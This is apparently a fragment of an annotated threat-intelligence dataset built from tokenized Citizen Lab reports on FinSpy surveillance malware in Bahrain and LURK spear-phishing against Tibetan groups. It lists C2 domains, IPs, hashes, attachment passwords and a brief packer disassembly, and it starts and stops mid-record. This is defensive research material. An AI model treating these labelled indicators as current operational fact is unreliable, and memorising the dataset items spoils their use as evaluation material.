"descriptions", "of", "the", "FinSpy", "tool", "collected", "by", "Privacy", "International", "among", "others", "and", "posted", "on", "Wikileaks8", "make", "the", "a", "series", "of", "claims", "about", "functionality", ":"], ["\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Bypassing", "of", "40", "regularly", "tested", "Antivirus", "Systems", "Covert", "Communication", "with", "Headquarters"], ["Full", "Skype", "Monitoring", "(", "Calls", ",", "Chats", ",", "File", "Transfers", ",", "Video", ",", "Contact", "List", ")"], ["Recording", "of", "common", "communication", "like", "Email", ",", "Chats", "and", "Voice", "-", "over", "-", "IP"], ["Live", "Surveillance", "through", "Webcam", "and", "Microphone", "Country", "Tracing", "of", "Target"], ["Silent", "Extracting", "of", "Files", "from", "Hard", "-", "Disk"], ["Process", "-", "based", "Key", "-", "logger", "for", "faster", "analysis"], ["Live", "Remote", "Forensics", "on", "Target", "System"], ["Advanced", "Filters", "to", "record", "only", "important", "information"], ["Supports", "most", "common", "Operating", "Systems", "(", "Windows", ",", "Mac", "OSX", "and", "Linux", ")", "18", "July", "2012", "Shared", "behavior", "with", "a", "sample", "that", "communicates", "with", "Gamma"], ["The", "virtual", "machine", "used", "by", "the", "packer", "has", "very", "special", "sequences", "in", "order", "to", "execute", "the", "virtualised", "code", ",", "for", "example", ":", "66", "C7", "07", "9D", "61", "mov", "word", "ptr"], ["[", "edi", "]", ",", "619Dh", "C6", "47", "02", "68", "mov", "byte", "ptr", "[", "edi+2", "]", ",", "68h", "89", "57", "03", "mov", "[", "edi+3", "]", ",", "edx", "C7", "47"], ["07", "68", "00", "00", "00", "mov", "dword", "ptr", "[", "edi+7", "]", ",", "68h", "89", "47", "08", "mov", "[", "edi+8", "]", ",", "eax", "C6", "47", "0C", "C3", "mov", "byte", "ptr"], ["[", "edi+0Ch", "]", ",", "0C3h"], ["Based", "on", "this", "we", "created", "a", "signature", "from", "the", "Bahrani", "malware", ",", "which", "we", "shared", "with", "another", "security", "researcher", "who", "identified", "a", "sample", "that", "shared", "similar", "virtualised", "obfuscation", "."], ["That", "sample", "is", ":", "md5", ":", "c488a8aaef0df577efdf1b501611ec20", "sha1", ":", "5ea6ae50063da8354e8500d02d0621f643827346", "sha256", ":", "81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf"], ["The", "sample", "connects", "to", "the", "following", "domains", ":"], ["tiger.gamma-international.de", "ff-demo.blogdns.org"], ["The", "domain", "tiger.gamma-international.de", "has", "the", "following", "Whois", "information9", ":", "Domain", ":"], ["gamma-international.de", "Name", ":", "Martin", "Muench", "Organisation", ":"], ["Gamma", "International", "GmbH"], ["Address", ":", "Baierbrunner", "Str", "."], ["15"], ["PostalCode", ":", "81379"], ["City", ":", "Munich", "CountryCode", ":", "DE", "Phone", ":", "+49", "-", "89", "-", "2420918", "-", "0"], ["Fax", ":", "+49", "-", "89", "-", "2420918", "-", "1"], ["Email", ":", "info@gamma-international.de"], ["Changed", ":", "2011", "-", "04", "-", "04T11:24:20", "+", "02:00", "19", "July", "2012", "Martin", "Muench", "is", "a", "representative", "of", "Gamma", "International", ",", "a", "company", "that", "sells", "\u201c", "advanced", "technical", "surveillance", "and", "monitoring", "solutions", "\u201d", "."], ["One", "of", "the", "services", "they", "provide", "is", "FinFisher", ":", "IT", "Intrusion", ",", "including", "the", "FinSpy", "tool", "."], ["This", "labelling", "indicates", "that", "the", "matching", "sample", "we", "were", "provided", "may", "be", "a", "demo", "copy"], ["a"], ["FinFisher", "product", "per", "the", "domain", "ff-demo.blogdns.org", "."], ["We", "have", "linked", "a", "set", "of", "novel", "virtualised", "code", "obfuscation", "techniques", "in", "our", "Bahraini", "samples", "to", "another", "binary", "that", "communicates", "with", "Gamma", "International", "IP", "addresses", "."], ["Taken", "alongside", "the", "explicit", "use", "of", "the", "name", "\u201c", "FinSpy", "\u201d", "in", "debug", "strings", "found", "in", "infected", "processes", ",", "we", "suspect", "that", "the", "malware", "is", "the", "FinSpy", "remote", "intrusion", "tool", "."], ["This", "evidence", "appears", "to", "be", "consistent", "with", "the", "theory", "that", "the", "dissidents", "in", "Bahrain", "who", "received", "these", "e", "-", "mails", "were", "targeted", "with", "the", "FinSpy", "tool", ",", "configured", "to", "exfiltrate", "their", "harvested", "information", "to", "servers", "in", "Bahraini", "IP", "space", "."], ["If", "this", "is", "not", "the", "case", ",", "we", "invite", "Gamma", "International", "to", "explain", "."], ["RECOMMENDATIONS"], ["The", "samples", "from", "email", "attachments", "have", "been", "shared", "with", "selected", "individuals", "within", "the", "security", "community", ",", "and", "we", "strongly", "urge", "antivirus", "companies", "and", "security", "researchers", "to", "continue", "where", "we", "have", "left", "off", "."], ["Be", "wary", "of", "opening", "unsolicited", "attachments", "received", "via", "email", ",", "skype", "or", "any", "other", "communications", "mechanism", "."], ["If", "you", "believe", "that", "you", "are", "being", "targeted", "it", "pays", "to", "be", "especially", "cautious", "when", "downloading", "files", "over", "the", "Internet", ",", "even", "from", "links", "that", "are", "purportedly", "sent", "by", "friends", "."], ["ACKNOWLEDGEMENTS"], ["Malware", "analysis", "by", "Morgan", "Marquis", "-", "Boire", "and", "Bill", "Marczak", "."], ["Assistance", "from", "Seth", "Hardy", "and", "Harry", "Tuttle", "gratefully", "received", "."], ["Special", "thanks", "to", "John", "Scott", "-", "Railton", "."], ["Thanks", "to", "Marcia", "Hofmann", "and", "the", "Electronic", "Frontier", "Foundation", "(", "EFF", ")", "."], ["We", "would", "also", "like", "to", "acknowledge", "Privacy", "International", "for", "their", "continued", "work", "and", "graciously", "provided", "background", "information", "on", "Gamma", "International", "."], ["20", "July", "2012", "FOOTNOTES", "1", "http://www.finfisher.com/", "http://owni.eu/2011/12/15/finfisher-for-all-your-intrusive-surveillance-needs/#SpyFiles", "3", "http://blogs.aljazeera.com/profile/melissa-chan"], ["4"], ["This", "technique", "was", "used", "in", "the", "recent", "Madi", "malware", "attacks", "."], ["5"], ["http://www.finfisher.com/"], ["6"], ["Unpacking", "Virtualised", "Obfuscators", "by", "Rolf", "Rolles"], ["http://static.usenix.org/event/woot09/tech/full_papers/rolles.pdf", "7", "http://whois.domaintools.com/77.69.140.194", "2", "8", "9", "E.g.", "http://wikileaks.org/spyfiles/files/0/289_GAMMA-201110-FinSpy.pdf", "http://whois.domaintools.com/gamma-international.de", "Back", "to", "top", "MEDIA", "COVERAGE"], ["The", "Wall", "Street", "Journal", "Slate", "CSO", "Tech", "Week", "Europe"], ["Bloomberg", "Electronic", "Frontier", "Foundation"], ["Privacy", "International", "Spiegel", "Online", "PC", "Mag"], ["The", "New", "York", "Times", "About", "the", "Author", "Morgan", "Marquis", "-", "Boire", "is", "a", "Technical", "Advisor", "at", "the", "Citizen", "Lab", ",", "Munk", "School", "of", "Global", "Affairs", ",", "University", "of", "Toronto", "."], ["He", "works", "as", "a", "Security", "Engineer", "at", "Google", "specializing", "in", "Incident", "Response", ",", "Forensics", "and", "Malware", "Analysis", "."], ["21"]]}, {"vertexSet": [[{"name": "LURK", "pos": [26, 27], "sent_id": 0, "type": "Malware"}], [{"name": "Tibetan organizations", "pos": [41, 43], "sent_id": 0, "type": "ExploitTargetObject"}], [{"name": "Microsoft Office", "pos": [16, 18], "sent_id": 3, "type": "Software"}], [{"name": "LURK", "pos": [12, 13], "sent_id": 4, "type": "TrojanHorse"}], [{"name": "Gh0stRAT", "pos": [24, 25], "sent_id": 4, "type": "TrojanHorse"}], [{"name": "dtl.dnsd.me", "pos": [24, 25], "sent_id": 5, "type": "Indicator"}], [{"name": "184.105.64.183", "pos": [26, 27], "sent_id": 5, "type": "Address"}], [{"name": "dtl.eatuo.com", "pos": [37, 38], "sent_id": 5, "type": "Indicator"}], [{"name": "Citizen Lab", "pos": [4, 6], "sent_id": 9, "type": "Organization"}], [{"name": "May and July 2012", "pos": [25, 29], "sent_id": 11, "type": "Time"}], [{"name": "LURK", "pos": [48, 49], "sent_id": 13, "type": "TrojanHorse"}], [{"name": "social engineering", "pos": [6, 8], "sent_id": 14, "type": "MalwareCharacteristics"}], [{"name": "Microsoft Office", "pos": [5, 7], "sent_id": 19, "type": "Software"}], [{"name": "Word", "pos": [10, 11], "sent_id": 19, "type": "Software"}], [{"name": "Excel", "pos": [14, 15], "sent_id": 19, "type": "Software"}], [{"name": "Droeshi", "pos": [1, 2], "sent_id": 23, "type": "Email"}], [{"name": "May 24, 2012", "pos": [21, 25], "sent_id": 24, "type": "Time"}], [{"name": "209.234.204.31", "pos": [13, 14], "sent_id": 25, "type": "Address"}], [{"name": "4155", "pos": [8, 9], "sent_id": 26, "type": "Password"}], [{"name": "Droeshi final.doc", "pos": [16, 18], "sent_id": 26, "type": "File"}], [{"name": "Statement of the Kashag", "pos": [1, 5], "sent_id": 29, "type": "Email"}], [{"name": "July 5", "pos": [6, 8], "sent_id": 30, "type": "Time"}], [{"name": "0706", "pos": [0, 1], "sent_id": 32, "type": "Password"}], [{"name": "65.166.97.211", "pos": [14, 15], "sent_id": 34, "type": "Address"}], [{"name": "eabliz@gmx.com", "pos": [28, 29], "sent_id": 34, "type": "Email"}], [{"name": "hientr@gmx.com", "pos": [30, 31], "sent_id": 34, "type": "Email"}], [{"name": "July6thFinal.doc", "pos": [9, 10], "sent_id": 35, "type": "File"}], [{"name": "The concept notes", "pos": [1, 4], "sent_id": 37, "type": "Email"}], [{"name": "July 17", "pos": [8, 10], "sent_id": 38, "type": "Time"}], [{"name": "EIDHR_action_plan.xlsx", "pos": [19, 20], "sent_id": 40, "type": "File"}], [{"name": "19333", "pos": [10, 11], "sent_id": 47, "type": "Password"}], [{"name": "walkinnet", "pos": [12, 13], "sent_id": 52, "type": "Attacker"}], [{"name": "c100tibet_board@gmx.com", "pos": [10, 11], "sent_id": 56, "type": "Email"}], [{"name": "ijoni_futbollisti@gmx.com", "pos": [12, 13], "sent_id": 56, "type": "Email"}], [{"name": "abarbour@gmx.com", "pos": [25, 26], "sent_id": 57, "type": "Email"}], [{"name": "jigme1@gmx.com", "pos": [27, 28], "sent_id": 57, "type": "Email"}], [{"name": "agnes9@gmx.com", "pos": [29, 30], "sent_id": 57, "type": "Email"}], [{"name": "207.178.172.2", "pos": [25, 26], "sent_id": 58, "type": "Address"}], [{"name": "August visit of South African group", "pos": [1, 7], "sent_id": 59, "type": "Email"}], [{"name": "July 20", "pos": [7, 9], "sent_id": 60, "type": "Time"}], [{"name": "1959", "pos": [4, 5], "sent_id": 64, "type": "Password"}], [{"name": "Dharamsala August 2012 Full program.xls", "pos": [5, 10], "sent_id": 65, "type": "File"}], [{"name": "set.xls", "pos": [6, 7], "sent_id": 67, "type": "File"}], [{"name": "58f6922dedb0d43c4478a4f38ad08620", "pos": [13, 14], "sent_id": 71, "type": "MD5"}], [{"name": "f2a0787388dd6373336b3f23f204524a", "pos": [16, 17], "sent_id": 71, "type": "MD5"}], [{"name": "0fe550a5d1187d38984c505ef7741638", "pos": [19, 20], "sent_id": 71, "type": "MD5"}], [{"name": "971f99af0f9df674a79507ed7b3010fb", "pos": [3, 4], "sent_id": 73, "type": "MD5"}], [{"name": "%Temp%\\iexplore.exe", "pos": [15, 17], "sent_id": 78, "type": "TrojanHorse"}], [{"name": "16160a6a9b905c69cb8e92c319212980", "pos": [3, 4], "sent_id": 80, "type": "MD5"}], [{"name": "1c22ee3326affee30c3fa65f0b8413d5", "pos": [7, 8], "sent_id": 80, "type": "MD5"}], [{"name": "%AppData%\\Application Data\\Help\\CREATELINK.EXE", "pos": [15, 18], "sent_id": 80, "type": "File"}], [{"name": "%AppData%\\Help\\IconCacheEt.DAT", "pos": [18, 22], "sent_id": 80, "type": "File"}], [{"name": "%AppData%\\Help\\IconConfigEt.DAT", "pos": [22, 26], "sent_id": 80, "type": "File"}], [{"name": "%AppData\\\\Help\\iexplore.exe", "pos": [0, 2], "sent_id": 81, "type": "File"}], [{"name": "C:\\Documents and Settings\\user\\Start Menu\\Programs\\Startup\\iexplore.lnk", "pos": [54, 58], "sent_id": 82, "type": "Indicator"}], [{"name": "0x11B297A9", "pos": [45, 46], "sent_id": 88, "type": "Indicator"}], [{"name": "TIBET", "pos": [28, 29], "sent_id": 104, "type": "Campaign"}], [{"name": "T706", "pos": [5, 6], "sent_id": 105, "type": "Campaign"}], [{"name": "T801", "pos": [27, 28], "sent_id": 105, "type": "Campaign"}], [{"name": "Troj~Agent-XAT", "pos": [5, 10], "sent_id": 111, "type": "TrojanHorse"}], [{"name": "TROJ_MDROP.TPB", "pos": [14, 15], "sent_id": 111, "type": "TrojanHorse"}], [{"name": "TROJ_MDROP.TPC", "pos": [16, 17], "sent_id": 111, "type": "TrojanHorse"}], [{"name": "Generic PWS", "pos": [35, 37], "sent_id": 111, "type": "Software"}], [{"name": "IE_0day", "pos": [18, 19], "sent_id": 112, "type": "Campaign"}], [{"name": "DbxUpdateET", "pos": [14, 15], "sent_id": 113, "type": "Indicator"}], [{"name": "IconCacheEt", "pos": [32, 33], "sent_id": 113, "type": "Indicator"}], [{"name": "IconConfigEt", "pos": [36, 37], "sent_id": 113, "type": "Indicator"}], [{"name": "184.105.64.183", "pos": [42, 43], "sent_id": 125, "type": "Address"}]], "labels": [{"r": "P21", "h": 5, "t": 3, "evidence": [4, 5]}, {"r": "P21", "h": 6, "t": 3, "evidence": [4, 5]}, {"r": "P21", "h": 7, "t": 3, "evidence": [4, 5]}, {"r": "P13", "h": 10, "t": 11, "evidence": [13, 14]}, {"r": "P9", "h": 20, "t": 26, "evidence": [29, 35]}, {"r": "P9", "h": 15, "t": 19, "evidence": [23, 26]}, {"r": "P9", "h": 27, "t": 29, "evidence": [37, 40]}, {"r": "P9", "h": 38, "t": 41, "evidence": [59, 65]}], "title": "201207CitizenLabLURK", "sents": [["The", "Citizen", "Lab", "Research", "Brief", "Number", "10", "\u2013", "July", "2012", "Recent", "Observations", "in", "Tibet", "-", "Related", "Information", "Operations", ":", "Advanced", "Social", "Engineering", "for", "the", "Distribution", "of", "LURK", "Malware", "KEY", "FINDINGS", "\uf0b7", "Social", "engineering", "techniques", "observed", "in", "recent", "targeted", "malware", "attacks", "against", "Tibetan", "organizations", "appear", "to", "repurpose", "authentic", ",", "privately", "-", "held", ",", "sensitive", "content", "of", "Tibetan", "groups", "\u2014", "in", "contrast", "to", "typical", "malware", "attacks", "that", "rely", "on", "simpler", "social", "engineering", "methods", ",", "such", "as", "referencing", "themes", "of", "interest", "to", "the", "organization", "or", "copying", "publicly", "available", "legitimate", "content", "."], ["The", "use", "of", "this", "unique", "content", "suggests", "that", "attackers", "may", "have", "achieved", "a", "preliminary", "level", "of", "infiltration", "into", "Tibetan", "organizations", ",", "which", "could", "allow", "them", "to", "increase", "the", "apparent", "authenticity", "of", "subsequent", "attacks", "."], ["\uf0b7"], ["These", "recent", "malware", "attacks", "have", "incorporated", "a", "\u201c", "passwording", "\u201d", "technique", ",", "whereby", "attached", ",", "infected", "Microsoft", "Office", "files", "are", "encrypted", "and", "can", "only", "be", "opened", "with", "a", "password", "provided", "in", "the", "email", "body", "."], ["\uf0b7", "The", "payload", "of", "each", "of", "these", "targeted", "malware", "attacks", "is", "the", "LURK", "malware", ",", "a", "remote", "access", "trojan", "that", "is", "a", "variant", "of", "Gh0stRAT", "."], ["\uf0b7", "Once", "active", ",", "the", "malware", "delivered", "through", "each", "of", "these", "targeted", "attacks", "connects", "to", "the", "same", "command", "-", "and", "-", "control", "server", ":", "dtl.dnsd.me:63", "(", "184.105.64.183", ")", ",", "which", "if", "inaccessible", "uses", "a", "backup", "domain", ",", "dtl.eatuo.com:63", "."], ["Both", "dnsd.me", "and", "eatuo.com", "are", "dynamic", "DNS", "providers", ",", "and", "eatuo.com", "has", "the", "same", "domain", "registration", "information", "as", "the", "well", "-", "known", "Chinese", "provider", "3322.net", "."], ["1", "Number", "10", "\u2013", "July", "2012", "BACKGROUND"], ["This", "blog", "post", "is", "the", "third", "in", "a", "series", "documenting", "the", "use", "of", "information", "operations", "against", "Tibetans", "and", "others", "who", "advocate", "for", "Tibetan", "rights", "and", "freedoms", "."], ["Previous", "research", "by", "the", "Citizen", "Lab", "has", "described", "information", "operations", "that", "leveraged", "the", "issue", "of", "selfimmolations", "amongst", "Tibetans", ",", "as", "well", "as", "a", "recent", "European", "Parliament", "resolution", "on", "the", "human", "rights", "situation", "in", "Tibet", "."], ["OVERVIEW"], ["In", "its", "ongoing", "study", "of", "targeted", "cyber", "threats", "against", "civil", "society", "organizations", ",", "Citizen", "Lab", "has", "analyzed", "11", "malicious", "emails", "sent", "to", "Tibetan", "organizations", "between", "May", "and", "July", "2012", "that", "display", "noteworthy", "common", "elements", ",", "including", "malware", "that", "connects", "to", "the", "same", "command", "-", "and", "-", "control", "server", "."], ["Attackers", "have", "targeted", "at", "least", "three", "separate", "organizations", ",", "sending", "the", "malicious", "emails", "to", "seven", "different", "email", "addresses", "associated", "with", "those", "three", "organizations", "."], ["In", "each", "of", "these", "emails", ",", "the", "malicious", "file", "is", "password", "-", "protected", ",", "such", "that", "it", "can", "only", "be", "opened", "with", "a", "password", "provided", "in", "the", "email", "text", "(", "or", "in", "one", "case", ",", "in", "an", "image", "attached", "to", "the", "email", ")", ",", "and", "the", "payload", "\u2014", "LURK", "malware", "\u2014", "is", "the", "same", "."], ["The", "level", "of", "authenticity", "of", "the", "social", "engineering", "used", "in", "these", "emails", ",", "however", ",", "has", "increased", "over", "time", ",", "with", "the", "most", "recent", "emails", "repurposing", "sensitive", "content", "of", "Tibetan", "groups", "that", "was", "most", "likely", "privately", "held", "and/or", "inaccessible", "to", "the", "general", "public", "."], ["The", "use", "of", "such", "content", "suggests", "that", "attackers", "may", "have", "achieved", "a", "preliminary", "level", "of", "infiltration", "into", "Tibetan", "organizations", ",", "which", "could", "allow", "them", "to", "accomplish", "more", "advanced", "and", "effective", "social", "engineering", ",", "thereby", "increasing", "the", "risk", "of", "compromise", "."], ["TARGETED", "MALWARE"], ["ATTACKS"], ["In", "the", "11", "emails", "there", "are", "four", "distinct", "messages", "used", "in", "the", "attacks", ",", "as", "outlined", "and", "illustrated", "below", "."], ["The", "malicious", "attachments", "are", "all", "Microsoft", "Office", "documents", "\u2014", "two", "Word", "documents", "and", "two", "Excel", "files", "\u2014", "that", "are", "encrypted", "using", "four", "-", "digit", "numeric", "passwords", ",", "perhaps", "in", "an", "attempt", "to", "prevent", "detection", "of", "the", "malicious", "file", "by", "antivirus", "software", ",", "or", "to", "increase", "the", "apparent", "authenticity", "of", "the", "document", "."], ["The", "passwords", "appear", "to", "have", "been", "chosen", "to", "reflect", "dates", "of", "historical", "significance", "with", "respect", "to", "Tibet", "\u2014", "for", "example", ",", "1959", "was", "the", "year", "of", "the", "Tibetan", "uprising", "against", "the", "rule", "of", "the", "Communist", "Party", "of", "China", ",", "which", "is", "commemorated", "by", "the", "Tibetan", "community", "every", "year", "on", "March", "10", "."], ["The", "malicious", "payloads", "all", "communicate", "with", "the", "same", "command", "-", "and", "-", "control", "(", "C2", ")", "server", "(", "discussed", "further", "below", ")", "."], ["2", "Number", "10", "\u2013", "July", "2012", "1", "."], ["\u201c", "Droeshi", "\u201d"], ["The", "first", "email", ",", "which", "was", "only", "sent", "to", "one", "email", "address", "of", "which", "we", "are", "aware", ",", "was", "sent", "on", "May", "24", ",", "2012", "from", "what", "appears", "to", "be", "a", "compromised"], ["yahoo.com", "email", "account", "associated", "with", "a", "Tibetan", "activist", ",", "from", "the", "IP", "address", "209.234.204.31", "(", "likely", "a", "compromised", "server", "):", "3", "Number", "10", "\u2013", "July", "2012", "Note", "that", "the", "salutation", "does", "not", "include", "the", "name", "of", "the", "recipient", ",", "nor", "is", "it", "signed", "."], ["The", "password", "required", "to", "open", "the", "attachment", "is", "4155.1", "The", "attachment", "is", "a", "Word", "document", "named", "Droeshi", "final.doc", "\u2014", "when", "opened", "and", "supplied", "with", "the", "password", ",", "it", "crashes", "Word", "and", "drops", "its", "malicious", "payload", "(", "described", "in", "more", "detail", "below", ")", "."], ["No", "clean", "file", "is", "dropped", "or", "shown", "to", "the", "user", ",", "and", "there", "is", "no", "author", "or", "summary", "metadata", "."], ["2", "."], ["\u201c", "Statement", "of", "the", "Kashag", "\u201d"], ["The", "second", "email", "was", "sent", "on", "July", "5", "to", "at", "least", "two", "different", "organizations", "."], ["The", "body", "of", "these", "emails", "contains", "only", "\u201c", "PASSWORD", ":"], ["0706.\u201d2", "The", "subject", "is", "\u201c", "THE", "STATEMENT", "OF", "THE", "KASHAG", "ON"], ["THE", "SEVENTY", "-", "SEVENTH", "BIRTHDAY", "CELEBRATION", "OF", "HIS", "HOLINESS", "THE", "DALAI", "LAMA", "\u201d", "and", "the", "\u201c", "From", "\u201d", "address", "spoofs", "the", "real", "address", "of", "a", "Tibetan", "organization", "."], ["Although", "the", "emails", "are", "identical", "and", "were", "sent", "from", "the", "same", "IP", "address", "(", "65.166.97.211", ")", ",", "the", "actual", "email", "addresses", "used", "to", "send", "each", "message", "differ", ":", "eabliz@gmx.com", "and", "hientr@gmx.com", "."], ["This", "email", "also", "attached", "a", "single", "Word", "document", ",", "July6thFinal.doc", ",", "that", "exhibits", "similar", "behaviour", "to", "the", "Droeshi", "document", "but", "drops", "a", "slightly", "different", "malicious", "executable", "."], ["3", "."], ["\u201c", "The", "concept", "notes", "\u201d"], ["The", "third", "email", "came", "in", "two", "versions", "on", "July", "17", ",", "differing", "only", "in", "an", "additional", "blank", "line", "in", "the", "email", "body", "and", "a", "typo", "in", "the", "subject", "line", "of", "one", "version", "."], ["The", "social", "engineering", "has", "been", "significantly", "stepped", "up", "in", "this", "attack", ",", "though", "there", "are", "still", "numerous", "tell", "-", "tale", "signs", "that", "it", "is", "not", "legitimate", "."], ["This", "email", "had", "five", "attachments", ":", "four", "benign", ".docx", "files", ",", "as", "well", "as", "a", "malicious", "Excel", "file", "named", "EIDHR_action_plan.xlsx", "."], ["4", "Number", "10", "\u2013", "July", "2012"], ["Again", "there", "is", "no", "name", "in", "the", "salutation", ",", "but", "the", "email", "is", "signed", "in", "this", "case", "."], ["The", "signature", "and", "\u201c", "From", "\u201d", "address", "used", "spoof", "a", "representative", "of", "the", "Office", "of", "Tibet", "."], ["The", "Word", "documents", "attached", "to", "this", "email", "contain", "what", "appears", "to", "be", "an", "actual", "application", "by", "a", "Tibetan", "organization", "to", "the", "European", "Instrument", "for", "Democracy", "and", "Human", "Rights", "(", "EIDHR", ")", "."], ["The", "timing", "of", "this", "attack", "is", "particularly", "noteworthy", "in", "that", "a", "genuine", "EIDHR", "call", "for", "proposals", "\u2014", "including", "for", "\u201c", "Actions", "Aimed", "at", "Fighting", "Cyber", "-", "Censorship", "and", "to", "Promote", "Internet", "Access", "and", "Secure", "Digital", "Communication", "\u201d", "\u2014", "was", "pending", "at", "the", "time", ",", "with", "a", "July", "20", "deadline", "for", "concept", "notes", "."], ["Such", "documentation", "related", "to", "grant", "proposals", "is", "typically", "of", "a", "sensitive", "and", "internal", "nature", "to", "civil", "society", "organizations", ",", "and", "inclusion", "of", "such", "content", "in", "a", "targeted", "malware", "attack", "is", "concerning", ",", "as", "it", "suggests", "access", "to", "confidential", "materials", "and", "perhaps", "even", "awareness", "of", "the", "parameters", "of", "the", "EIDHR", "call", "."], ["Only", "the", "attached", "malicious", "Excel", "file", "requires", "the", "password", "\u2014", "19333", "\u2014", "to", "open", ",", "whereas", "the", "attached", "Word", "documents", "are", "not", "password", "protected", "."], ["The", "malicious", "Excel", "file", "is", "actually", "an", "OLE", "file", ",", "not", "the", "newer", "Office", "Open", "XML", "format", "that", "the", ".xlsx", "extension", "suggests", ",", "and", "Excel", "refuses", "to", "open", "it", "unless", "the", "extension", "is", "changed", "to", ".xls", "."], ["The", "dropped", "malicious", "executable", "is", "identical", "to", "the", "one", "from", "the", "\u201c", "Statement", "of", "the", "Kashag", "\u201d", "email", "."], ["This", "file", "also", "drops", "a", "clean", "document", ",", "\u201c", "set.xls", ",", "\u201d", "in", "the", "user", "\u2019s", "temporary", "folder", "and", "opens", "it", "in", "Excel", "."], ["The", "contents", "of", "the", "file", "were", "unreadable", "on", "all", "computers", "we", "tried", "it", "on", ",", "displaying", "only", "question", "marks", "."], ["However", ",", "the", "metadata", "of", "the", "file", "shows", "the", "author", "as", "\u2018", "walkinnet", "\u2019", "."], ["5", "Number", "10", "\u2013", "July", "2012"], ["We", "saw", "five", "instances", "of", "this", "message", ",", "going", "to", "three", "different", "organizations", "."], ["The", "email", "with", "the", "typo", "in", "the", "subject", "(", "\u201c", "Tthe", "concept", "notes", "\u201c", ")", "went", "to", "two", "different", "organizations", ",", "from", "a", "different", "IP", "(", "66.103.141.237", ")", "than", "the", "\u201c", "Statement", "of", "the", "Kashag", "\u201d", "email", "."], ["Different", "gmx.com", "addresses", "were", "used", "to", "send", "each", "message", ":", "c100tibet_board@gmx.com", "and", "ijoni_futbollisti@gmx.com", "."], ["The", "other", "three", "instances", "of", "this", "email", "had", "the", "subject", "\u201c", "The", "concept", "notes", "\u201d", "and", "were", "sent", "by", "yet", "more", "unique", "gmx.com", "addresses", ":", "abarbour@gmx.com", ",", "jigme1@gmx.com", "and", "agnes9@gmx.com", "."], ["The", "first", "two", "were", "sent", "from", "the", "same", "IP", "as", "used", "for", "the", "\u201c", "Statement", "of", "the", "Kashag", ",", "\u201d", "but", "the", "third", "came", "from", "207.178.172.2", ".", "6", "Number", "10", "\u2013", "July", "2012", "4", "."], ["\u201c", "August", "visit", "of", "South", "African", "group", "\u201d"], ["The", "most", "recent", "email", "was", "sent", "on", "July", "20", "to", "at", "least", "two", "organizations", ",", "one", "of", "which", "received", "it", "at", "two", "different", "addresses", "."], ["The", "email", "contains", "text", "and", "an", "Excel", "attachment", "that", ",", "as", "with", "the", "\u201c", "The", "concept", "notes", "\u201d", "email", ",", "suggest", "the", "attacker", "had", "access", "to", "confidential", "communications", "of", "a", "Tibetan", "organization", "."], ["The", "spoofed", "\u201c", "From", "\u201d", "address", ",", "subject", "(", "\u201c", "August", "visit", "of", "South", "African", "group", "\u201d", ")", ",", "and", "text", "of", "the", "email", "all", "appear", "to", "be", "repurposed", "from", "an", "authentic", "message", "sent", "to", "a", "Tibetan", "organization", "from", "a", "person", "seeking", "advice", "regarding", "an", "upcoming", "trip", "to", "Dharamsala", ",", "and", "the", "content", "includes", "in", "-", "depth", "details", "on", "trip", "logistics", "and", "planning", "."], ["In", "this", "case", ",", "the", "password", "required", "to", "open", "the", "attached", "Excel", "file", "is", "not", "in", "the", "body", "of", "the", "email", ",", "but", "added", "(", "rather", "awkwardly", ")", "to", "an", "attached", "image", "of", "the", "logo", "of", "the", "organization", "belonging", "to", "the", "spoofed", "sender", "."], ["The", "password", "is", "\u201c", "1959", ",", "\u201d", "the", "year", "of", "the", "aforementioned", "Tibetan", "uprising", "."], ["The", "attached", "Excel", "file", ",", "Dharamsala", "August", "2012", "Full", "program.xls", ",", "is", "similar", "to", "the", "malicious", "attachment", "in", "\u201c", "The", "concept", "notes", "\u201d", "email", ",", "but", "it", "drops", "a", "different", "clean", "file", "."], ["In", "this", "case", "the", "file", "is", "readable", "and", "contains", "what", "is", "almost", "certainly", "an", "authentic", "itinerary", ",", "which", "is", "referenced", "in", "the", "email", "."], ["The", "clean", "file", "is", "also", "called", "set.xls", ",", "defaults", "to", "the", "same", "Chinese", "font", ",", "and", "has", "the", "same", "\u2018", "walkinnet", "\u2019", "author", "metadata", "as", "the", "clean", "document", "in", "\u201c", "The", "concept", "notes", ".", "\u201d"], ["TECHNICAL", "ANALYSIS", "Delivery", "Methods"], ["Within", "the", "dataset", "examined", "by", "Citizen", "Lab", ",", "two", "Word", "documents", "and", "two", "Excel", "documents", "were", "sent", "embedded", "with", "LURK", "malware", ",", "a", "remote", "access", "trojan", "that", "is", "a", "variant", "of", "Gh0stRAT", "."], ["Note", "that", "the", "XLSX", "file", "is", "actually", "a", "standard", ".XLS", "file", ",", "not", "the", "new", "XML", "format", "."], ["The", "MD5", "hashes", "of", "the", "documents", "are", "as", "follows", ":", "Droeshi", "final.doc", "\u2013", "58f6922dedb0d43c4478a4f38ad08620", "July6thFinal.doc", "\u2013", "f2a0787388dd6373336b3f23f204524a", "EIDHR_action_plan.xlsx", "\u2013", "0fe550a5d1187d38984c505ef7741638"], ["Dharamsala", "August", "2012"], ["Full", "program.xls", "\u2013", "971f99af0f9df674a79507ed7b3010fb", "7", "Number", "10", "\u2013", "July", "2012", "Each", "document", "is", "encrypted", "with", "a", "four", "-", "digit", "numeric", "password", ",", "a", "tactic", "seen", "previously", "in", "other", "emails", "."], ["This", "tactic", "makes", "it", "more", "difficult", "to", "identify", "embedded", "payloads", "and", "the", "vulnerability", "used", "."], ["All", "of", "the", "files", "except", "for", "the", "first", "(", "Droeshi", "final.doc", ")", "have", "the", "same", "malware", "files", "embedded", "."], ["The", "first", "uses", "a", "variant", "of", "the", "LURK", "trojan", "that", "is", "very", "similar", ",", "but", "not", "identical", ",", "to", "the", "others", "."], ["Infection"], ["In", "each", "of", "the", "four", "cases", ",", "the", "document", "exploit", "drops", "the", "LURK", "trojan", ":", "%", "Temp%\\iexplore.exe", "Two", "different", "versions", "of", "the", "trojan", "were", "seen", "between", "the", "four", "cases", "."], ["While", "they", "all", "use", "the", "same", "filenames", ",", "in", "one", "case", ",", "the", "MD5", "of", "the", "trojan", "is", "different", ":", "July6thFinal.doc", ",", "EIDHR_action_plan.xlsx", ",", "Dharamsala", "August", "2012"], ["Full", "program.xls", ":", "16160a6a9b905c69cb8e92c319212980", "Droeshi", "final.doc", ":", "1c22ee3326affee30c3fa65f0b8413d5", "LURK", "also", "uses", "the", "following", "files", ":", "%", 